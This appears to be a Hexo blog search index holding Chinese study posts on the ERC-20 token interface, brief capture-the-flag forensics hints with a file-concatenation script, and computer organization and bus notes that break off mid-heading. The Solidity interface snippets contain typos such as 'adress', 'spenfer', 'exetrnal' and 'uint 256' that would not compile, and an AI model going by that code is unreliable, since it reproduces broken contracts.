<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ERC20</title>
      <link href="/2024/06/11/ERC20/"/>
      <url>/2024/06/11/ERC20/</url>
      
        <content type="html"><![CDATA[<h3 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h3><p>ERC是Ethereum Request for Comments的首字母缩写。它就像技术文档，定义了适用于一群想要利用以太坊生态系统的开发者和用户的方法、行为、创新和研究。ERC-20介绍了在以太坊区块链上创建可互换代币的代币标准，在该协议下的相同的代币完全一致。</p><p>ERC-20 提出了一个同质化代币的标准，换句话说，它们具有一种属性，使得每个代币都与另一个代币（在类型和价值上）完全相同。 例如，一个 ERC-20 代币就像以太币一样，意味着一个代币会并永远会与其他代币一样。</p><p>ERC-20（以太坊意见征求 20）由 Fabian Vogelsteller 提出于 2015 年 11 月。这是一个能实现智能合约中代币的应用程序接口标准。</p><p>ERC-20 的功能示例包括：</p><ol><li>将代币从一个帐户转到另一个帐户</li><li>获取帐户的当前代币余额</li><li>获取网络上可用代币的总供应量</li><li>批准一个帐户中一定的代币金额由第三方帐户使用</li></ol><p>如果智能合约实施了下列方法和事件，它可以被称为 ERC-20 代币合约，一旦部署，将负责跟踪以太坊上创建的代币。</p><h3 id="接口定义"><a class="markdownIt-Anchor" href="#接口定义"></a> 接口定义</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token operator">/</span> SPDX<span class="token operator">-</span>License<span class="token operator">-</span>Identifier<span class="token punctuation">:</span> MIT<span class="token comment">// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">IERC20</span> <span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="transfer-事件"><a class="markdownIt-Anchor" href="#transfer-事件"></a> Transfer 事件</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">event</span> <span class="token function">Transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">indexed</span> <span class="token keyword">from</span> <span class="token punctuation">,</span>adress <span class="token keyword">indexed</span> to <span class="token punctuation">,</span><span class="token builtin">uint256</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 定义Transfer事件，在发生交易转移时触发。Solidity event在 EVM 的日志记录功能之上提供了一个抽象。应用程序可以通过以太坊客户端的 RPC 接口订阅和监听这些事件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="approval-事件"><a class="markdownIt-Anchor" href="#approval-事件"></a> Approval 事件</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">event</span> <span class="token function">Approval</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">indexed</span> owner<span class="token punctuation">,</span> <span class="token builtin">address</span> <span class="token keyword">indexed</span> spenfer<span class="token punctuation">,</span> <span class="token builtin">uint</span> <span class="token number">256</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 定义Approval事件，在发生代币授权时触发该事件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="totalsupply-函数"><a class="markdownIt-Anchor" href="#totalsupply-函数"></a> totalSupply 函数</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">totalSupply</span><span class="token punctuation">(</span><span class="token punctuation">)</span> exetrnal <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获得当前代币的总供应量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="balanceof-函数"><a class="markdownIt-Anchor" href="#balanceof-函数"></a> balanceOf 函数</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// 获取当前账户的代币余额</span> <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> account<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="transfer-函数"><a class="markdownIt-Anchor" href="#transfer-函数"></a> transfer 函数</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// 代币转移函数，将amount数量的代币转移到to地址</span> <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="transferfrom-函数"><a class="markdownIt-Anchor" href="#transferfrom-函数"></a> transferFrom 函数</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity">    <span class="token comment">// 从from地址转移amounts数量到to地址</span>    <span class="token keyword">function</span> <span class="token function">transferFrom</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span>        <span class="token builtin">address</span> to<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> amount    <span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="allowance-函数"><a class="markdownIt-Anchor" href="#allowance-函数"></a> allowance 函数</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">//获取owner地址账号授权（approve方法进行授权）给spender地址的代币数量</span><span class="token keyword">function</span> <span class="token function">allowance</span><span class="token punctuation">(</span><span class="token builtin">address</span> owner<span class="token punctuation">,</span> <span class="token builtin">address</span> spender<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="approve-函数"><a class="markdownIt-Anchor" href="#approve-函数"></a> approve 函数</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// 授权给spender地址 amount数量的代币，spender账户可以转移该数量代币通过调用</span><span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="链接"><a class="markdownIt-Anchor" href="#链接"></a> 链接</h3><p><a href="https://learnblockchain.cn/article/4506">https://learnblockchain.cn/article/4506</a></p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界</title>
      <link href="/2024/05/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
      <url>/2024/05/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="pdf"><a class="markdownIt-Anchor" href="#pdf"></a> pdf</h3><p>移开图片，即可得到flag</p><h3 id="base64stego"><a class="markdownIt-Anchor" href="#base64stego"></a> base64stego</h3><p>伪加密，然后base64隐写</p><h3 id="流量分析2"><a class="markdownIt-Anchor" href="#流量分析2"></a> 流量分析2</h3><p>发现text.txt文件，导出http</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> osdata <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'test(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">).txt'</span></span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token keyword">as</span> f<span class="token punctuation">:</span>        de <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        s<span class="token operator">+=</span>de<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment"># &#123;17uaji1l&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="神奇的modbus"><a class="markdownIt-Anchor" href="#神奇的modbus"></a> 神奇的Modbus</h3><p>搜索modbus，然后追踪tcp流即可。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/2024/05/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
      <url>/2024/05/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章-计算机组成原理概述"><a class="markdownIt-Anchor" href="#第一章-计算机组成原理概述"></a> 第一章 计算机组成原理概述</h2><h3 id="计算机发展历程"><a class="markdownIt-Anchor" href="#计算机发展历程"></a> 计算机发展历程</h3><h4 id="计算机硬件的发展"><a class="markdownIt-Anchor" href="#计算机硬件的发展"></a> 计算机硬件的发展</h4><p>计算机系统=硬件+软件<br>硬件的发展：</p><ol><li>第一代：使用电子管</li><li>第二代：使用晶体管</li><li>第三代：使用较小规模的集成电路</li><li>第四代：使用较大规模的集成电路</li></ol><h4 id="计算机软件的发展"><a class="markdownIt-Anchor" href="#计算机软件的发展"></a> 计算机软件的发展</h4><h3 id="计算机系统层次结构"><a class="markdownIt-Anchor" href="#计算机系统层次结构"></a> 计算机系统层次结构</h3><h4 id="计算机系统组成"><a class="markdownIt-Anchor" href="#计算机系统组成"></a> 计算机系统组成</h4><p>计算机系统由硬件系统和软件系统共同构建起来</p><h4 id="计算机硬件的基本组成"><a class="markdownIt-Anchor" href="#计算机硬件的基本组成"></a> 计算机硬件的基本组成</h4><p>程序存储：指令以代码的形式事先输入到计算机的主存储器中，然后按其在存储器中的首地址执行程序的第一条指令，以后就按该程序的规定顺序执行其他指令，直至程序执行结束。即按地址访问并顺序执行指令。<br>计算机按此原理应有五大功能：数据传送功能、数据存储功能、操作控制功能、操作判断功能</p><h5 id="冯诺漫体系结构特点"><a class="markdownIt-Anchor" href="#冯诺漫体系结构特点"></a> 冯诺漫体系结构特点：</h5><ol><li>计算机硬件由五大部分组成（存储器、运算器、控制器、输出设备、输入设备）</li><li>指令和数据以同等地位存于存储器，可按地址寻访</li><li>指令和数据以二进制表示</li><li>指令由操作码和地址码组成</li><li>存储程序</li><li>以运算器为中心</li></ol><p>早期的冯·诺依曼机以运算器为中心，且是单处理机，最根本的特征是采用“存储程序”原理，基本工作方式是控制流驱动方式！<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240612162828.png" alt></p><h5 id="现代计算机的组织结构"><a class="markdownIt-Anchor" href="#现代计算机的组织结构"></a> 现代计算机的组织结构</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240612162919.png" alt></p><h5 id="计算机的功能部件"><a class="markdownIt-Anchor" href="#计算机的功能部件"></a> 计算机的功能部件</h5><p>主机：主存、运算器、控制器<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240612163244.png" alt><br>&lt;1&gt; 输入设备，是指将外部信息以计算机能读懂的方式输入进来，如键盘，鼠标等</p><p>&lt;2&gt; 输出设备，就是将计算机处理的信息以人所能接受的方式输出出来，比如显示屏，打印机。</p><p>&lt;3&gt; 存储器，存储器分为 主存储器(内存储器，CPU能直接访问)和 辅助存储器(外存储器，协助主存储器记忆更多的信息，辅助存储器的信息需要导入到主存储器中，才可以被CPU访问)。</p><p>主存储器的工作方式是按存储单元的地址进行存取，这种存取方式称为按地址存取方式<br>主存储器是由地址寄存器(MAR)，数据寄存器(MDR)，存储体，时序控制逻辑，地址寄存器存放访存地址，经过地址译码后找到所选的存储单元。数据寄存器，是存储器与其他部件的中介，用于暂存要从存储器读或写的信息。时序控制逻辑用于产生存储器操作所需的各种时序信号。在现代CPU，MAR和MDR是在CPU中的。<br>&lt;4&gt; 运算器，是计算机的运算单元，用于算术运算和逻辑运算<br>运算器的核心单元是算术逻辑单元(ALU)<br>&lt;5&gt; 控制器，控制器是计算机的指挥中心，有其指挥各部件自动协调第进行工作，现代计算机将运算器和控制器集成到一个芯片上，合成为中央处理器，简称CPU。有程序计数器(PC)、指令寄存器(IR)和控制单元(CU)。<br>一般将运算器和控制器集成到同一个芯片上，称为中央处理器(CPU)。CPU和主存储器共同构成主机，而除主机外的其他硬件装置(外存、I/O设备等)统称为外部设备，简称外设。</p><h4 id="计算机软件的分类"><a class="markdownIt-Anchor" href="#计算机软件的分类"></a> 计算机软件的分类</h4><h5 id="系统软件和应用软件"><a class="markdownIt-Anchor" href="#系统软件和应用软件"></a> 系统软件和应用软件</h5><p>计算机软件，一般分为系统软件和应用软件<br>系统软件包括 操作系统，数据库管理系统，语言处理系统(比如编译器)，分布式软件系统，网络软件系统，标准库系统，服务性系统(比如连接程序)。</p><p>应用软件包括各种科学计算类程序，工程设计类程序，数据统计与处理程序</p><h5 id="三个级别的语言"><a class="markdownIt-Anchor" href="#三个级别的语言"></a> 三个级别的语言</h5><ol><li>机器语言。又称二进制代码语言，需要编程人员记忆每条指令的二进制编码。机器语言是计算机唯一可以直接识别和执行的语言。</li><li>汇编语言。汇编语言用英文单词或其缩写代替二进制的指令代码，更容易为人们记忆和理解。使用汇编语言编辑的程序，必须经过一个称为汇编程序的系统软件的翻译，将其转换为计算机的机器语言后，才能在计算机的硬件系统上执行。</li><li>高级语言。高级语言(如C、C++、Java等)是为方便程序设计人员写出解决问题的处理方案和解题过程的程序。通常高级语言需要经过编译程序编译成汇编语言程序，然后经过汇编操作得到机器语言程序，或直接由高级语言程序翻译成机器语言程序。</li></ol><p>由高级语言转换到汇编语言的过程叫做编译，由汇编语言转换到机器语言的过程叫做汇编，边翻译边执行的叫做解析。</p><p>机器语言是计算机唯一可以直接执行的语言，汇编语言用助记符编写，以便记忆。而正则语言是编译原理中符合正则文法的语言。</p><p>解释程序的特点是翻译一句执行一句，边翻译边执行：由高级语言转化为汇编语言的过程称为编译，把汇编语言源程序翻译成机器语言程序的过程称为汇编。</p><h3 id="计算机性能指标"><a class="markdownIt-Anchor" href="#计算机性能指标"></a> 计算机性能指标</h3><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240612180015.png" alt></p><ol><li>机器字长：<br>计算机的位数，表示计算机进行一次整数运算所能处理的二进制数据的位数。计算机字长通常选为字节（8位）的整数倍，通常2，4，8倍。不同的计算机，字节可能不同。</li></ol><p>机器字长、指令字长、存储字长的区别和联系是什么？</p><p>机器字长：计算机能直接处理的二进制数据的位数，机器字长一般等于内部寄存器的大小，它决定了计算机的运算精度。<br>指令字长：一个指令字中包含的二进制代码的位数。<br>存储字长：一个存储单元存储的二进制代码的长度。等于MDR的位数， 它们都必须是字节的整数倍。<br>数据字长：数据总线一次能传送信息的位数，它可以不等于MDR的位数。</p><p>指令字长一般取存储字长的整数倍，若指令字长等于存储字长的2倍，则需要2次访存来取出一条指令，因此取指周期为机器周期的2倍；若指令字长等于存储字长，则取指周期等于机器周期。</p><p>早期的计算机存储字长一般和机器的指令字长与数据字长相等，因此访问一次主存便可取出一条指令或一个数据。随着计算机的发展，指令字长可变，数据字长也可变，但它们必须都是字节的整数倍。</p><p>请注意64位操作系统是指特别为64位架构的计算机而设计的操作系统，它能够利用64位处理器的优势。但64位机器既可以使用64位操作系统，又可以使用32位操作系统。而32位处理器是无法使用64位操作系统的。</p><ol start="2"><li>数据通路带宽：<br>数据总线一次所能传送信息的位数</li><li>主存容量：<br>MAR的位数反应存储单元的个数。如MAR为16位，表示存储单元为2^16 = 64K;若MDR为32位，则存储容量为2^16x32.</li><li>运算速度：<br>吞吐量指系统在单位时间处理请求的数量。从用户观点看，它是评价计算机系统性能的综合参数！<br>CPU时钟周期。通常为节拍脉冲或T周期，即主频的倒数，它是CPU中最小的时间单位，每个动作至少需要1个时钟周期。</li></ol><p>主频(CPU时钟频率)。机器内部主时钟的频率，是衡量机器速度的重要参数。</p><p>CPU周期又称为机器周期，由多个时钟周期组成！<br>指令周期&gt;CPU周期&gt;时钟周期<br>CPI（Clock cycle Per Instruction），即执行一条指令所需的时钟周期数。</p><p>CPU执行时间，指运行一个程序所花费的时间。<br>CPU执行时间 = CPU时钟周期数/主频 = (指令条数xCPI)/主频<br>CPU的性能取决于三个要素:主频、CPI 、指令条数</p><p>IPS(Instructions Per Second) =主频/平均CPI，每秒执行多少指令</p><p>MIPS(Million Instructions Per Second)=即每秒执行多少百万条指令。</p><p>MFLOPS(Mega Floating-point Operations Per Second)=浮点操作次数/(执行时间x106),即每秒执行多少百万次浮点运算。</p><p>GFLOPS(Giga Floating-point Operations Per Second)=浮点操作次数/(执行时间x109)，即每秒执行多少十亿次浮点运算。</p><p>TFLOPS(Tera Floating-point Operations Per Second)=浮点操作次数/(执行时间x1012)，即每秒执行多少万亿次浮点运算。</p><h3 id="常见问题"><a class="markdownIt-Anchor" href="#常见问题"></a> 常见问题</h3><p>1.同一个功能既可以由软件实现又可以由硬件实现吗？</p><p>软件和硬件是两种完全不同的形态，硬件是实体，是物质基础；软件是一种信息，看不见、摸不到。但在逻辑功能上，软件和硬件是等效的。因此，在计算机系统中，许多功能既可以由硬件直接实现，又可以在硬件的配合下由软件实现。<br>一个最大的区别就是，硬件实现比软件实现的速度快很多，但是成本也高！所以，芯片在流片之后，如果发现bug可以用软件修复就用软件修复！</p><p>2.翻译程序、汇编程序、编译程序、解释程序有什么差别？各自的特性是什么？</p><p>翻译程序是指把高级语言源程序翻译成机器语言程序（目标代码）的软件。<br>翻译程序有两种：一种是编译程序，它将高级语言源程序一次全部翻译成目标程序，每次执行程序时，只需执行目标程序，因此只要源程序不变，就无须重新翻译，请注意同一种高级语言在不同体系结构下，编译成目标程序是不一样的，目标程序与体系结构相关，但仍不是计算机硬件能够直接执行的程序。另一种是解释程序，它将源程序的一条语句翻译成对应的机器目标代码，并立即执行，然后翻译下一条源程序语句并执行，直至所有源程序语句全部被翻译并执行完。所以解释程序的执行过程是翻译一句执行一句，并且不会生成目标程序。<br>汇编程序也是一种语言翻译程序，它把汇编语言源程序翻译为机器语言程序。汇编语言是种面向机器的低级语言，是机器语言的符号表示，与机器语言一一对应。<br>编译程序与汇编程序的区別：若源语言是诸如C、C++、Java等“高级语言”，而目标语言是诸如汇编语言或机器语言之类的“低级语言”，则这样的一个翻译程序称为编译程序。若源语言是汇编语言，而目标语言是机器语言，则这样的一个翻译程序称为汇编程序。</p><p>3.什么是透明性？透明是指什么都能看见吗？</p><p>在计算机领域中，站在某类用户的角度，若感觉不到某个事物或属性的存在，即“看”不到某个事物或属性，则称为“对该用户而言，某个事物或属性是透明的”。这与日常生活中的“透明”概念(公开、看得见)正好相反。<br>例如，对于高级语言程序员来说，浮点数格式、乘法指令等这些指令的格式、数据如何在运算器中运算等都是透明的；而对于机器语言或汇编语言程序员来说，指令的格式、机器结构、数据格式等则不是透明的。<br>在CPU中，IR、MAR和MDR对各类程序员都是透明的。</p><p>4.机器字长、指令字长、存储字长的区别和联系是什么？</p><p>机器字长：计算机能直接处理的二进制数据的位数，机器字长一般等于内部寄存器的大小，它决定了计算机的运算精度。<br>指令字长：一个指令字中包含的二进制代码的位数。<br>存储字长：一个存储单元存储的二进制代码的长度。等于MDR的位数， 它们都必须是字节的整数倍。<br>数据字长：数据总线一次能传送信息的位数，它可以不等于MDR的位数。</p><p>指令字长一般取存储字长的整数倍，若指令字长等于存储字长的2倍，则需要2次访存来取出一条指令，因此取指周期为机器周期的2倍；若指令字长等于存储字长，则取指周期等于机器周期。</p><p>早期的计算机存储字长一般和机器的指令字长与数据字长相等，因此访问一次主存便可取出一条指令或一个数据。随着计算机的发展，指令字长可变，数据字长也可变，但它们必须都是字节的整数倍。</p><p>请注意64位操作系统是指特别为64位架构的计算机而设计的操作系统，它能够利用64位处理器的优势。但64位机器既可以使用64位操作系统，又可以使用32位操作系统。而32位处理器是无法使用64位操作系统的。</p><p>5.计算机体系结构和计算机组成的区别和联系是什么？</p><p>计算机体系结构是指机器语言或汇编语言程序员所看得到的传统机器的属性，包括指令集、数据类型、存储器寻址技术等，大都属于抽象的属性。<br>计算机组成是指如何实现计算机体系结构所体现的属性，它包含对许多对程序员来说透明的硬件细节。例如，指令系统属于结构的问题，但指令的实现即如何取指令、分析指令、取操作数如何运算等都属于组成的问题。因此，当两台机器指令系统相同时，只能认为它们具有相同的结构，至于这两台机器如何实现其指令，完全可以不同，即可以认为它们的组成方式是不同的。例如，一台机器是否具备乘法指令是一个结构的问题，但实现乘法指令采用什么方式则是一个组成的问题。（简言之，看有没有这个属性，就是结构问题；看怎么实现，就是组成问题）<br>许多计算机厂商提供一系列体系结构相同的计算机，而它们的组成却有相当大的差别，即使是同一系列的不同型号机器，其性能和价格差异也很大。例如， IBM System/370结构就包含了多种价位和性能的机型。</p><p>6.基准程序执行得越快说明机器的性能越好吗？</p><p>一般情况下，基准测试程序能够反映机器性能的好坏。但是，由于基准程序中的语句存在频度的差异，因此运行结果并不能完全说明问题。</p><!-- ## 第二章 数据的表示与运算![](https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618102206.png)### 数制与编码#### 进制转换![](https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618102507.png)#### BCD码是为了表示0和9，所以1010~1111都是违法的![](https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618102631.png)#### 字符与字符串![](https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618102714.png)#### 校验码### --><h2 id="第三章-系统总线"><a class="markdownIt-Anchor" href="#第三章-系统总线"></a> 第三章 系统总线</h2><h3 id="总线的基本概念"><a class="markdownIt-Anchor" href="#总线的基本概念"></a> 总线的基本概念</h3><p>计算机系统的五大部件之间的互联方式有两种，一种是各部件之间使用的单独连线，称为分散连接；一种使将各部件连到一组公共信息传输线上，称为总线连接。<br>（在某一时刻，只允许一个部件向总线发送信息，多个部件可以同时从总线上接受相同的信息。）<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618103743.png" alt></p><h3 id="总线的分类"><a class="markdownIt-Anchor" href="#总线的分类"></a> 总线的分类</h3><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618104224.png" alt></p><h4 id="连接部件"><a class="markdownIt-Anchor" href="#连接部件"></a> 连接部件</h4><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618104453.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618104435.png" alt></p><ol><li>片内总线：指芯片内部的总线，如在CPU芯片内部，寄存器与寄存器之间、寄存器与算逻单<br>元ALU之间都由片内总线连接。</li><li>系统总线：是指CPU 、主存、I/O设备各大部件之间的信息传输线。。由于这些<br>部件通常都安放在主板或各个插件板（插卡）上，故又称板级总线（在一块电路板上各芯片间的连线）或板间总线。<br>按系统总线传输信息的不同，又可分为三类：数据总线、地址总线和控制总线。</li><li>通信总线：用于计算机系统之间或计算机系统与替他系统之间的通信。由于这类联系涉及许多方面，如外部连接、距离远近、速度快慢、工作方式等，差别极大，因此通信总线的类别很多。但按传输方式可分为两种：串行通信和并行通信。</li></ol><h3 id="总线特性及性能指标"><a class="markdownIt-Anchor" href="#总线特性及性能指标"></a> 总线特性及性能指标</h3><h4 id="总线特性"><a class="markdownIt-Anchor" href="#总线特性"></a> 总线特性</h4><p>机械特性、电气特性、功能特性、时间特性。<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/23.png" alt></p><h4 id="总线的性能指标"><a class="markdownIt-Anchor" href="#总线的性能指标"></a> 总线的性能指标</h4><p>①总线宽度：通常是指数据总线的根数，用bit（位）表示，如8位、16位、32位、64位（即8根、16根、32根、64根）。<br>②总线带宽：总线带宽可理解为总线的数据传输速率，即单位时间内总线上传输数据的位数，通常用每秒传输信息的学节数来衡量，单位可用MBpS（兆节每秒）表示。例如，总线工作频率为33MHz，总线宽度为32位（4B），则总线带宽为33×（32/8）=132MBps。<br>③时钟同步/异步：总线上的数据与时钟同步工作的总线称为同步总线，与时钟不同步工作<br>的总线称为异步总线。<br>④总线复用：一条信号线上分时传送两种信号。例如，通常地址总线与数据总线在物理上<br>是分开的两种总线，地址总线传输地址码，数据总线传输数据信息。为了提高总线的利用率，优化设计，特将地址总线和数据总线共用一组物理线路，在这组物理线路上分时传输地址信号和数据信号，即为总线的多路复用。<br>⑤信号线数：地址总线、数据总线和控制总线三种总线数的总和。<br>⑥总线控制方式：包括突发工作、自动配置、仲裁方式、逻辑方式、计数方式等。<br>⑦其他指标：如负载能力、电源电压（是采用5V还是3.3V）、总线宽度能否扩展等。<br>总线的负载能力即驱动能力，是指当总线接上负载后，总线输人输出的逻辑电平是否能保持<br>在正常的额定范围内。</p><h4 id="总线标准"><a class="markdownIt-Anchor" href="#总线标准"></a> 总线标准</h4><h3 id="总线结构"><a class="markdownIt-Anchor" href="#总线结构"></a> 总线结构</h3><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618105404.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618105409.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618105426.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618105449.png" alt></p><h3 id="总线控制"><a class="markdownIt-Anchor" href="#总线控制"></a> 总线控制</h3><p>包括判优控制和通信控制</p><h4 id="总线判优控制"><a class="markdownIt-Anchor" href="#总线判优控制"></a> 总线判优控制</h4><p>总线上所连接的各类设备，按其对总线有无控制功能可分为主设备（模块）和从设备（模块）两种。主设备对总线有控制权，从设备只能响应丛主设备发来的总线命令，对总线没有控制权。<br>总线判优控制可分集中式和分布式两种，前者将控制逻辑集中在一一处（如在CPU中），后者将控制逻辑分散在与总线连接的各个部件或设备上。<br>常见的几种优先权仲裁方式</p><ol><li>链式查询<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618110139.png" alt><br>离总线控制部件最近的设备具有最高的优先级。<br>特点：只需很少几根线就能按一定的优先次序实现总线控制，并很容易扩充设备，但是对电路故障很敏感，且优先级别低的设备可能很难获得请求。</li><li>计数器定时查询<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618110503.png" alt><br>计数也以从上一次计数的终点开始。<br>这种方式对电路故障不如链式查询方式敏感。伯增加了控制线（设备地址）数，控制也较复杂。</li><li>独立请求方式<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240618110553.png" alt><br>这种方式的特点是：响应速度快，优先次序控制灵活（通过程序改变），但控制线数量多，总线控制更复杂。</li></ol><h4 id="总线通信控制"><a class="markdownIt-Anchor" href="#总线通信控制"></a> 总线通信控制</h4><p>总线通信控制主要解决通信双方如伺获知传输升始和传输结束，以及通信双方如伺协调如<br>何配合。<br>总线传输周期</p><p>①申请分配阶段：主模块申请，总线仲裁决定</p><p>②寻址阶段：主模块从模块给出地址和命令</p><p>③传数阶段：主模块和从模块交换数据</p><p>④结束阶段：主模块撤销有关信息<br>通常用四种方式：同步通信、异步通信、半同步通信和分离式通信。</p><h3 id="问题"><a class="markdownIt-Anchor" href="#问题"></a> 